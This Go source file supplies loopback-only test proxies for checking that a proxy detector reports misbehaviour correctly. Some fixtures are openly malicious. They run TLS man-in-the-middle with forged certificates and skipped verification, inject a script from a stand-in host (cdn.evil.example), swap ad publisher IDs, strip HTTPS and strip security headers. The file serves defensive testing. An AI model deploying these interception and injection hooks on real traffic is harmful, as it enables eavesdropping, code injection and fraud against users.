// Package evil 提供自测用的代理夹具：几个规矩的代理，和一批各有毛病或存心作恶的代理。
//
// 它们只监听回环地址，用来验证探测器的每一种判定：已知夹具会做什么，就看探测器是否如实报告。
// 这里的“作恶”代码是在模拟攻击者，所以会出现正式代码里不允许的写法（比如不校验上游证书）。
package evil

import (
	"bufio"
	"bytes"
	"compress/gzip"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/binary"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Behavior 描述一个夹具的行为。零值是规矩的代理。
type Behavior struct {
	Proto string // http、socks5、socks4、raw

	NoConnect    bool                                    // CONNECT 一律回 405
	NoForward    bool                                    // 普通转发请求一律回 400
	ConnectPorts map[int]bool                            // 非空时，CONNECT 只允许这些端口
	Auth         bool                                    // 要求认证
	Delay        time.Duration                           // 回答前先等这么久
	MITM         bool                                    // 隧道建立后自己冒充目标做 TLS
	ReqHook      func(h http.Header, clientIP string)    // 改写发给上游的请求头
	RespHook     func(h http.Header, body []byte) []byte // 改写返回给客户端的响应
	Replay       int                                     // 正常转发之后，把同一个请求再向上游多发几次
	CacheReplay  bool                                    // 把第一次的响应原样返回给之后的每个请求
	EgressIP     string                                  // 连上游时使用的本地地址
	AfterOK      []byte                                  // 声称隧道建好之后不转发，而是发这些字节
	CloseAfterOK bool                                    // 声称隧道建好之后直接断开
	Raw          func(c net.Conn)                        // 完全自定义
	Resolve      map[string]string                       // 主机名到地址的映射
	Status       int                                     // 非零时，转发请求不去上游，直接回这个状态码
	StatusHeader map[string]string                       // 配合 Status：附带的响应头
	Truncate     int                                     // 非零时，响应正文只发这么多字节（Content-Length 不变）
}

type Fixture struct {
	Name  string
	Label string // 假装列表给它贴的协议标签
	Addr  string
	B     Behavior

	ln    net.Listener
	mu    sync.Mutex
	cache []byte
}

// Start 在回环地址上启动一个夹具。
func Start(name, label string, b Behavior) (*Fixture, error) {
	return StartAt("127.0.0.1", name, label, b)
}

// StartAt 在指定的回环地址上启动夹具（127.0.0.0/8 里的地址都可以直接用）。
// 夹具连上游时用同一个地址作源地址，除非行为里另外指定了出口。
func StartAt(ip, name, label string, b Behavior) (*Fixture, error) {
	ln, err := net.Listen("tcp4", net.JoinHostPort(ip, "0"))
	if err != nil {
		return nil, err
	}
	if b.EgressIP == "" && ip != "127.0.0.1" {
		b.EgressIP = ip
	}
	f := &Fixture{Name: name, Label: label, Addr: ln.Addr().String(), B: b, ln: ln}
	go f.accept()
	return f, nil
}

// Closed 返回一个没人监听的地址。
func Closed(name, label string) (*Fixture, error) {
	return ClosedAt("127.0.0.1", name, label)
}

// ClosedAt 在指定地址上返回一个没人监听的端口。
func ClosedAt(ip, name, label string) (*Fixture, error) {
	ln, err := net.Listen("tcp4", net.JoinHostPort(ip, "0"))
	if err != nil {
		return nil, err
	}
	addr := ln.Addr().String()
	ln.Close()
	return &Fixture{Name: name, Label: label, Addr: addr}, nil
}

func (f *Fixture) Close() {
	if f.ln != nil {
		f.ln.Close()
	}
}

func (f *Fixture) accept() {
	for {
		c, err := f.ln.Accept()
		if err != nil {
			return
		}
		go func() {
			defer c.Close()
			c.SetDeadline(time.Now().Add(60 * time.Second))
			switch {
			case f.B.Raw != nil:
				f.B.Raw(c)
			case f.B.Proto == "socks5":
				f.socks5(c)
			case f.B.Proto == "socks4":
				f.socks4(c)
			default:
				f.http(c)
			}
		}()
	}
}

func (f *Fixture) resolve(host string) string {
	if ip, ok := f.B.Resolve[host]; ok {
		return ip
	}
	return host
}

func (f *Fixture) dial(host string, port int) (net.Conn, error) {
	d := net.Dialer{Timeout: 5 * time.Second}
	if f.B.EgressIP != "" {
		d.LocalAddr = &net.TCPAddr{IP: net.ParseIP(f.B.EgressIP)}
	}
	return d.Dial("tcp4", net.JoinHostPort(f.resolve(host), strconv.Itoa(port)))
}

type bufConn struct {
	net.Conn
	r *bufio.Reader
}

func (c *bufConn) Read(p []byte) (int, error) { return c.r.Read(p) }

func relay(a, b net.Conn) {
	done := make(chan struct{}, 2)
	cp := func(dst, src net.Conn) {
		io.Copy(dst, src)
		if t, ok := dst.(interface{ CloseWrite() error }); ok {
			t.CloseWrite()
		} else {
			dst.Close()
		}
		done <- struct{}{}
	}
	go cp(a, b)
	go cp(b, a)
	<-done
	<-done
}

// tunnel 处理“请连到 host:port”的请求，ok 和 fail 负责按各自协议回话。
func (f *Fixture) tunnel(c net.Conn, br *bufio.Reader, host string, port int, ok, fail func()) {
	client := &bufConn{Conn: c, r: br}
	switch {
	case f.B.CloseAfterOK:
		ok()
		return
	case f.B.AfterOK != nil:
		ok()
		c.Write(f.B.AfterOK)
		time.Sleep(300 * time.Millisecond)
		return
	case f.B.MITM:
		ok()
		cert, err := SelfSigned(host)
		if err != nil {
			return
		}
		tc := tls.Server(client, &tls.Config{Certificates: []tls.Certificate{cert}})
		if err := tc.Handshake(); err != nil {
			return
		}
		raw, err := f.dial(host, port)
		if err != nil {
			return
		}
		// 攻击者不关心上游证书是真是假
		up := tls.Client(raw, &tls.Config{InsecureSkipVerify: true, ServerName: host})
		defer up.Close()
		if err := up.Handshake(); err != nil {
			return
		}
		relay(tc, up)
		return
	}
	up, err := f.dial(host, port)
	if err != nil {
		fail()
		return
	}
	defer up.Close()
	ok()
	relay(client, up)
}

func (f *Fixture) http(c net.Conn) {
	br := bufio.NewReader(c)
	status := func(code int, extra string) {
		fmt.Fprintf(c, "HTTP/1.1 %d %s\r\n%sContent-Length: 0\r\nConnection: close\r\n\r\n", code, http.StatusText(code), extra)
	}
	req, err := http.ReadRequest(br)
	if err != nil {
		status(400, "") // 真实的 HTTP 代理收到看不懂的字节，一般回 400
		return
	}
	time.Sleep(f.B.Delay)
	if f.B.Auth {
		status(407, "Proxy-Authenticate: Basic realm=\"proxy\"\r\n")
		return
	}
	if req.Method == http.MethodConnect {
		if f.B.NoConnect {
			status(405, "")
			return
		}
		host, ps, err := net.SplitHostPort(req.RequestURI)
		if err != nil {
			status(400, "")
			return
		}
		port, _ := strconv.Atoi(ps)
		if f.B.ConnectPorts != nil && !f.B.ConnectPorts[port] {
			status(403, "")
			return
		}
		f.tunnel(c, br, host, port,
			func() { io.WriteString(c, "HTTP/1.1 200 Connection established\r\n\r\n") },
			func() { status(502, "") })
		return
	}
	if f.B.NoForward || !req.URL.IsAbs() {
		status(400, "")
		return
	}
	if f.B.Status != 0 {
		extra := ""
		for k, v := range f.B.StatusHeader {
			extra += k + ": " + v + "\r\n"
		}
		status(f.B.Status, extra)
		return
	}
	if f.B.CacheReplay {
		f.mu.Lock()
		cached := f.cache
		f.mu.Unlock()
		if cached != nil {
			c.Write(cached)
			return
		}
	}
	host, port := req.URL.Hostname(), 80
	if p := req.URL.Port(); p != "" {
		port, _ = strconv.Atoi(p)
	}
	hdr := req.Header.Clone()
	hdr.Del("Proxy-Connection")
	if f.B.ReqHook != nil {
		clientIP, _, _ := net.SplitHostPort(c.RemoteAddr().String())
		f.B.ReqHook(hdr, clientIP)
	}
	var out bytes.Buffer
	fmt.Fprintf(&out, "%s %s HTTP/1.1\r\nHost: %s\r\n", req.Method, req.URL.RequestURI(), req.Host)
	for k, vs := range hdr {
		for _, v := range vs {
			fmt.Fprintf(&out, "%s: %s\r\n", k, v)
		}
	}
	out.WriteString("\r\n")

	fetch := func() (*http.Response, []byte, error) {
		up, err := f.dial(host, port)
		if err != nil {
			return nil, nil, err
		}
		defer up.Close()
		up.SetDeadline(time.Now().Add(10 * time.Second))
		if _, err := up.Write(out.Bytes()); err != nil {
			return nil, nil, err
		}
		resp, err := http.ReadResponse(bufio.NewReader(up), req)
		if err != nil {
			return nil, nil, err
		}
		defer resp.Body.Close()
		body, err := io.ReadAll(resp.Body)
		return resp, body, err
	}
	resp, body, err := fetch()
	if err != nil {
		status(502, "")
		return
	}
	for i := 0; i < f.B.Replay; i++ {
		fetch()
	}
	rh := resp.Header.Clone()
	rh.Del("Transfer-Encoding")
	if f.B.RespHook != nil {
		body = f.B.RespHook(rh, body)
	}
	rh.Set("Content-Length", strconv.Itoa(len(body)))
	var back bytes.Buffer
	fmt.Fprintf(&back, "HTTP/1.1 %d %s\r\n", resp.StatusCode, http.StatusText(resp.StatusCode))
	for k, vs := range rh {
		for _, v := range vs {
			fmt.Fprintf(&back, "%s: %s\r\n", k, v)
		}
	}
	back.WriteString("\r\n")
	if f.B.Truncate > 0 && len(body) > f.B.Truncate {
		body = body[:f.B.Truncate]
	}
	back.Write(body)
	if f.B.CacheReplay {
		f.mu.Lock()
		f.cache = append([]byte{}, back.Bytes()...)
		f.mu.Unlock()
	}
	c.Write(back.Bytes())
}

func (f *Fixture) socks5(c net.Conn) {
	br := bufio.NewReader(c)
	var h [2]byte
	if _, err := io.ReadFull(br, h[:]); err != nil || h[0] != 0x05 {
		return
	}
	if _, err := io.CopyN(io.Discard, br, int64(h[1])); err != nil {
		return
	}
	time.Sleep(f.B.Delay)
	if f.B.Auth {
		c.Write([]byte{0x05, 0xff})
		return
	}
	c.Write([]byte{0x05, 0x00})
	var q [4]byte
	if _, err := io.ReadFull(br, q[:]); err != nil || q[1] != 0x01 {
		return
	}
	var host string
	switch q[3] {
	case 0x01:
		var a [4]byte
		io.ReadFull(br, a[:])
		host = net.IP(a[:]).String()
	case 0x03:
		l, _ := br.ReadByte()
		b := make([]byte, l)
		io.ReadFull(br, b)
		host = string(b)
	default:
		c.Write([]byte{0x05, 0x08, 0, 1, 0, 0, 0, 0, 0, 0})
		return
	}
	var pb [2]byte
	if _, err := io.ReadFull(br, pb[:]); err != nil {
		return
	}
	port := int(binary.BigEndian.Uint16(pb[:]))
	f.tunnel(c, br, host, port,
		func() { c.Write([]byte{0x05, 0x00, 0, 1, 0, 0, 0, 0, 0, 0}) },
		func() { c.Write([]byte{0x05, 0x05, 0, 1, 0, 0, 0, 0, 0, 0}) })
}

func (f *Fixture) socks4(c net.Conn) {
	br := bufio.NewReader(c)
	var q [8]byte
	if _, err := io.ReadFull(br, q[:]); err != nil || q[0] != 0x04 || q[1] != 0x01 {
		return
	}
	if _, err := br.ReadBytes(0x00); err != nil {
		return
	}
	time.Sleep(f.B.Delay)
	port := int(binary.BigEndian.Uint16(q[2:4]))
	host := net.IP(q[4:8]).String()
	f.tunnel(c, br, host, port,
		func() { c.Write([]byte{0x00, 0x5a, 0, 0, 0, 0, 0, 0}) },
		func() { c.Write([]byte{0x00, 0x5b, 0, 0, 0, 0, 0, 0}) })
}

// ---------------------------------------------------------------- 现成的原始行为

// Tarpit 接受连接后一直不说话。
func Tarpit(c net.Conn) {
	io.Copy(io.Discard, c)
}

// Banner 返回一个一连上就发指定字节的行为。
func Banner(b string) func(net.Conn) {
	return func(c net.Conn) {
		io.WriteString(c, b)
		io.Copy(io.Discard, c)
	}
}

// WebServer 模拟一个普通网站：不管收到什么请求（包括 CONNECT），都回 200 和自己的页面。
// 公开列表里有不少这样的地址，只看状态码的检测器会把它们算成可用代理。
func WebServer(c net.Conn) {
	br := bufio.NewReader(c)
	for {
		line, err := br.ReadString('\n')
		if err != nil {
			return
		}
		if line == "\r\n" || line == "\n" {
			break
		}
	}
	body := "<!DOCTYPE html><html><head><title>Welcome to nginx!</title></head><body><h1>Welcome to nginx!</h1></body></html>\n"
	fmt.Fprintf(c, "HTTP/1.1 200 OK\r\nServer: nginx\r\nContent-Type: text/html\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", len(body), body)
}

// Garbage 对任何输入都回一串无意义的字节。
func Garbage(c net.Conn) {
	buf := make([]byte, 16)
	c.Read(buf)
	c.Write([]byte("\x01\x02\x03\x04 not a proxy \xff\xfe\r\n"))
}

// ---------------------------------------------------------------- 现成的改写钩子

// InjectScript 在 </body> 前插入一段脚本。
func InjectScript(h http.Header, body []byte) []byte {
	if !strings.Contains(h.Get("Content-Type"), "html") {
		return body
	}
	return bytes.Replace(body, []byte("</body>"),
		[]byte(`<script src="http://cdn.evil.example/inject.js"></script></body>`), 1)
}

// SwapAdID 把广告发布者 ID 换成攻击者自己的。
func SwapAdID(h http.Header, body []byte) []byte {
	return bytes.ReplaceAll(body, []byte("ca-pub-0000000000000000"), []byte("ca-pub-6666666666666666"))
}

// StripHTTPS 把页面里的 https 链接改成 http（SSL 剥离）。
func StripHTTPS(h http.Header, body []byte) []byte {
	return bytes.ReplaceAll(body, []byte("https://"), []byte("http://"))
}

// StripSecurityHeaders 去掉内容安全策略并丢掉 Cookie，正文不动。
func StripSecurityHeaders(h http.Header, body []byte) []byte {
	h.Del("Content-Security-Policy")
	h.Del("Set-Cookie")
	return body
}

// AddProxyHeaders 给响应加上代理软件常见的头，正文不动。
func AddProxyHeaders(h http.Header, body []byte) []byte {
	h.Set("Via", "1.1 fixture (squid/5.7)")
	h.Set("X-Cache", "MISS from fixture")
	return body
}

// GzipBody 不管客户端要不要，都把正文压缩后返回。内容本身没变。
func GzipBody(h http.Header, body []byte) []byte {
	var buf bytes.Buffer
	zw := gzip.NewWriter(&buf)
	zw.Write(body)
	zw.Close()
	h.Set("Content-Encoding", "gzip")
	return buf.Bytes()
}

// LeakClientIP 把客户端地址写进发给上游的请求（透明代理）。
func LeakClientIP(h http.Header, clientIP string) {
	h.Set("X-Forwarded-For", clientIP)
	h.Set("Via", "1.1 fixture")
}

// AnonymousVia 暴露自己是代理，但不暴露客户端地址。
func AnonymousVia(h http.Header, clientIP string) {
	h.Set("Via", "1.1 fixture")
}

// TamperRequest 改掉 User-Agent，丢掉 Cookie 和自定义头。
func TamperRequest(h http.Header, clientIP string) {
	h.Set("User-Agent", "fixture-proxy/1.0")
	h.Del("Cookie")
	h.Del("X-Probe-Canary")
}

// ---------------------------------------------------------------- 证书

var (
	certMu    sync.Mutex
	certCache = map[string]tls.Certificate{}
)

// SelfSigned 现场签一张给定主机名的自签证书，中间人夹具用它冒充目标。
func SelfSigned(host string) (tls.Certificate, error) {
	certMu.Lock()
	defer certMu.Unlock()
	if c, ok := certCache[host]; ok {
		return c, nil
	}
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return tls.Certificate{}, err
	}
	serial, _ := rand.Int(rand.Reader, big.NewInt(1<<62))
	tpl := &x509.Certificate{
		SerialNumber: serial,
		Subject:      pkix.Name{CommonName: host, Organization: []string{"Fixture MITM"}},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(24 * time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}
	if ip := net.ParseIP(host); ip != nil {
		tpl.IPAddresses = []net.IP{ip}
	} else {
		tpl.DNSNames = []string{host}
	}
	der, err := x509.CreateCertificate(rand.Reader, tpl, tpl, &key.PublicKey, key)
	if err != nil {
		return tls.Certificate{}, err
	}
	c := tls.Certificate{Certificate: [][]byte{der}, PrivateKey: key}
	certCache[host] = c
	return c, nil
}
